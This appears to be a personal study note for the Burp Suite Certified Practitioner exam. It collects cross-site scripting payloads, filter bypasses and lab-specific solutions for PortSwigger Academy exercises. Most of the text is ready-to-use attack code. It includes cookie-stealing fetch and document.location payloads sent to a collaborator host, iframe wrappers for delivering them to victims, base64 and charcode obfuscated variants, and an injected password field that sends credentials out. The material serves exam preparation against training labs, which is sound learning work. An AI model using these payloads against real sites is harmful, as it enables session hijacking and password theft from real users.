## Stage 1 + 2
### Payload Resources
- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)

### CSP Evaluator
Check for CSP (mitigate XSS attacks) so we know to use other methods to exploit(?)
https://csp-evaluator.withgoogle.com/

### Payloads to Steal Cookies
[CookieStealer](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md)


**Need to learn bypasses**
- learn how to use the XSS cheat sheet
	- https://medium.com/@ossamayasserr/practice-exam-2-writeup-portswigger-academy-95096bb0b212
	- https://www.youtube.com/watch?v=Cyv3dEQcxM8
- learn how to identify + exploit xss without payloads + DOM Invader
	- https://www.youtube.com/watch?v=WCVIRx_eODE

---
#TODO For next time, need to learn how to quickly identify behaviors on how the input is reflected to corresponding payloads. Like if angle brackets are HTML encoded, then what to do.

--- 
### Ultimate XSS Polyglot
Try this monster xss payload. It just might work.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Identify Vulnerabilities in Exam
- Reflected/Stored XSS: Target scan search bar + comment field + website field
- DOM-based: DOM Invader

For payloads solutions that only sends through the URL
```
<iframe src="{URL_ENCODED_PAYLOAD}"></iframe>

# fetch Example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E"></iframe>

# document.location Example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=2&storeId="></select><script>document.location%3d'https%3a//OASTIFY.COM/%3fdomxss%3d'%2bdocument.cookie</script>//"></iframe>
```

If `<script>` doesn't work, try:
- `</ScRiPt >`

Useful bypasses for "Potentially dangerous search term"
```
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >

"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"

"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```

**Different ways to get JS to fire**
- If your input is in an attribute like `href` in `<a href=" "` then try `javascript:alert();//`. The end result in page source should look like:
```
<a href="javascript:alert();//">Back</a>
```

- If your input is in an attribute like `<input value="test123">` then try `" onmouseover="alert();//"`. The `"` will escape the double quote in `value=""` then you can inject a new attribute for your JS to fire.
```
<input value="test123" onmouseover="alert();//"">
```

- If single quotes gets escapes like `test123'` turns into `test123\'` try 
```
# if your input is inside a <script> like
<script> var searchTerms = 'test123\' </script>

# use the payload
</script><script>alert(1)</script>

# The </script> will break out of the existing <script> tag
# Example
<script> var searchTerms = 'test123\' </script> <script>alert(1)</script> </script>
```

- If angle brackets are HTML encoded meaning `<script>` turns into `&lt;` and if your input is inside a `<script>` tag already then try using `;` to escape out
```
# if your input is inside a <script> like
<script> var searchTerms = 'test123\' </script>

# use semicolon to terminate the last method and start a new one
# your payload 
test123; alert();//

# Example
<script> var searchTerms = 'test123'; alert();// </script>
```




#### Single quote escaping
[Source](https://medium.com/infosecmatrix/cross-site-scripting-contexts-for-bug-bounty-portswigger-2024-b927cfa70de3)
```
# your input
';alert(document.domain)//

# gets converted to (notice the backslash)
\';alert(document.domain)//

# use this payload
\';alert(document.domain)//

# gets coverted to (an additional backslash) the 2nd backslash is interpreted literally; not a special character so that the single quote is now interprets as a string terminator -- allowing xss
\\';alert(document.domain)//
```

#### HTML encode payload
```
# xss example -- if the app escapes or blocks any characters within your payload, html encode them
<a href="#" onclick="... var input='controllable data here'; ...">

# payload example -- &apos; is html decoded to ' 
&apos;-alert(document.domain)-&apos;
```

#### JavaScript template literal
```
# if some special characters are unicode escaped like if single quote turned into \u0027 and in an JavaScript variable
<script> var message = `test123\u0027`; document.ElementById....

# payload like this will fire
${alert(document.domain)}

# Example
<script> var message = `test123\u0027 ${alert(document.cookie)}`
```

#### DOM-based
- `addEventListener`
	- `JSON.parse(e.data)` 
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.3.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20%60JSON.parse%60%20%E2%AD%95%EF%B8%8F)
	- `getElementById()`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.1.%20Lab%20DOM%20XSS%20using%20web%20messages%20%E2%AD%95%EF%B8%8F)
	- `indexOf('http')`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.2.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL%20%E2%AD%95%EF%B8%8F)
- `lastViewedProduct`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM-based%20cookie%20manipulation%20%E2%AD%95%EF%B8%8F)
- `storeId={CITY}` like *storeId=London*
	- `document.write('</select>');` in Page Source
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20inside%20a%20select%20element%20%E2%AD%95%EF%B8%8F)
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=2&storeId="></select><script>document.location%3d'https%3a//OASTIFY.COM/%3fdomxss%3d'%2bdocument.cookie</script>//"></iframe>
```
--
- `searchLogger.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.2.%20Lab%20DOM%20XSS%20via%20client-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)

- `jquery_3-0-0.js`
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [Client side](Client%20side.md#2.3.%20Lab%20DOM%20XSS%20via%20an%20alternative%20prototype%20pollution%20vector%20%E2%AD%95%EF%B8%8F)

- `jQuery 1.8.2`
	- `GET /feedback?returnPath=/`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM%20XSS%20in%20jQuery%20anchor%20%60href%60%20attribute%20sink%20using%20%60location.search%60%20source%20%E2%AD%95%EF%B8%8F)
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3adocument.location%3d'https%3a//OATSIFY.COM%3fc%3d'%2bdocument.cookie"></iframe>

# Encoded version (document.location)
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3adocument.location%3d'https%3a//OATSIFY.COM%3fc%3d'%2bdocument.cookie

# Encoded version (fetch)
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3afetch(`https%3a//OATSIFY.COM/c%3d`%2bdocument.cookie)%3b
```

- `returnUrl = /url`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.4.%20Lab%20DOM-based%20open%20redirection%20%E2%AD%95%EF%B8%8F)
- `html.replace`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Stored%20DOM%20XSS%20%E2%AD%95%EF%B8%8F)
- `hashchange`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event%20%E2%AD%95%EF%B8%8F)

- "HTML is allowed"
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Exploiting%20DOM%20clobbering%20to%20enable%20XSS%20%E2%AD%95%EF%B8%8F)

- DOM Invader > Inject forms > Search
	- `document.write(1)`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20%E2%AD%95%EF%B8%8F)
Deliver exploit to victim
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E"></iframe>

# Encoded version
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E

# Decoded version
https://YOUR-LAB-ID.web-security-academy.net/?search="'><img src onerror="fetch('https://OASTIFY.COM/?c='+document.cookie)">1'"<>

```

^4not06
--
	- `element.InnerHTML(1)`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.4.%20Lab%20DOM%20XSS%20in%20%60innerHTML%60%20sink%20using%20source%20%60location.search%60%20%E2%AD%95%EF%B8%8F)
		- Use the same payload as [README](Burp%20Suite%20Exam/Stage%201/XSS/README.md#%5E4not06)
	- `element.setAttribute.href(1)` / `ng-app` / `angular 1.7.7`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%7B%7B%24on.constructor%28%27document.location%3D%22https%3A%2F%2FOASTIFY.COM%3Fc%3D%22%2Bdocument.cookie%27%29%28%29%7D%7D"></iframe>

# Plug this in search bar
{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
```
--
	- `eval(1)`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Reflected%20DOM%20XSS%20%E2%AD%95%EF%B8%8F)


#### Reflected XSS

```
# Test with this
'<script>alert(1)</script>

# Try this in search bar and check collaborator
'<script>fetch("https://OASTIFY.COM/?p='+document.cookie");</script>

# URL encode payload, wrap in iframe, deliver to victim
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%27%3Cscript%3Efetch%28%22https%3A%2F%2FOASTIFY.COM%2F%3Fp%3D%27%2Bdocument.cookie%22%29%3B%3C%2Fscript%3E"></iframe>
```
[Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded%20%E2%AD%95%EF%B8%8F)

- Content-Security-Policy
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP%2C%20with%20dangling%20markup%20attack%20%E2%AD%95%EF%B8%8F)
- `rel="canonical"`
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%20%E2%AD%95%EF%B8%8F)
- `&lt;script&gt;alert(1)&lt;/script&gt;`
	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20attribute%20with%20angle%20brackets%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
- `var searchTerms`
	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20HTML%20encoded%20%E2%AD%95%EF%B8%8F)
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped%20%E2%AD%95%EF%B8%8F)
	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped%20%E2%AD%95%EF%B8%8F)
- `var message`
	- Payload enclosed in backticks
		- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets%2C%20single%2C%20double%20quotes%2C%20backslash%20and%20backticks%20Unicode-escaped%20%E2%AD%95%EF%B8%8F)
- `var key`
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings%20%E2%AD%95%EF%B8%8F)
- "Tag is not allowed"
	- `<body>` / `<custom tags>` == 200 OK
		- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked%20%E2%AD%95%EF%B8%8F)
	- `<svg>` == 200 OK
		- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed%20%E2%AD%95%EF%B8%8F)
	- `<xss+id=x>#x';` == 200 OK
		- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones%20%E2%AD%95%EF%B8%8F)


#### Stored XSS

Simple Stored XSS example to grab victim cookies. No need to URL encode since we aren't sending this via an URL.
```
# document.location example
</p><script>document.location='https://OASTIFY.COM/?p='+document.cookie</script>

# fetch example
</p><script>fetch('https://OASTIFY.COM/?p='+document.cookie);</script>
```

**If alert(1) doesn't trigger**: then try posting any of this in a comment (replace with exploit url) and got entries in the access log from the victim, then we have blind xss.
![474](README-20260219095007415.png)
```
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```
[Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)


- **Post Comment**
	- Solved with `</p><script>alert(1)</script>`
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20HTML%20context%20with%20nothing%20encoded%20%E2%AD%95%EF%B8%8F)
	- Solve with `javascript:alert(1)`
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20anchor%20%60href%60%20attribute%20with%20double%20quotes%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
	- `website` field has client side validation / `onclick`
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20%60onclick%60%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped%20%E2%AD%95%EF%B8%8F)
	- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)
	- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords%20%E2%AD%95%EF%B8%8F%0A-%20%60POST%20%2Fmy-account%2Fchange-email%60%0A%09-%20Remove%20%60csrf%60%20token%0A%09%09-%20400%20Bad%20Request%3A%20%22Missing%20parameter%20%27csrf%27%22%0A%09%09%09-%20%5B%5BStored%20XSS%231.x.%20Lab%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses%20%E2%AD%95%EF%B8%8F)


